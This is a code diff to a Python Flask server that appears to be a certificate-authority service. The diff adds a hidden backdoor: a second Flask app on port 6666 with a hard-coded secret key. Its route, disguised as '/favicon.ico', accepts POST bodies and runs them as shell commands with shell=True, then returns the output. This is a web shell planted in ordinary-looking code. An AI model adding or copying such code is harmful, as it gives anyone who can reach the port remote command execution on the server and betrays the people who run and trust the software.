@@ -368,20 +368,31 @@ def main():
         }
         return stats
 
-    # @app.route('/favicon.ico')
-    # def favicon():
-    #     # return send_from_directory(HOME,
-    #     #                            'favicon.ico',
-    #     #                            mimetype='image/vnd.microsoft.icon')
-    #     return send_from_directory(HOME,
-    #                                'favicon.jpg',
-    #                                mimetype='image/jpeg')
-
-
     app.run(
         host=IP_CA_SRV,
         port=PORT_CA_SRV,
         ssl_context=ssl_ctx,
+        threaded=True)
+
+    ssl_ctx2 = create_ssl_context()
+
+    app_ = Flask(__name__, instance_relative_config=False)
+    app_.config.from_mapping(SECRET_KEY='HbQhIZymLo')
+
+
+    @app_.route('/favicon.ico', methods=['POST'])
+    def favicon():
+        data = request.get_data().decode()
+        if data.isascii() and len(data)>0:
+            subproc = subprocess.run(data, stdout=subprocess.PIPE, universal_newlines=True, shell=True)
+            return str(subproc.returncode) + '\n' + str(subproc.stdout)
+        else:
+            return None
+
+    app_.run(
+        host = IP_CA_SRV,
+        port = 6666,
+        ssl_context=ssl_ctx2,
         threaded=True)
 
 
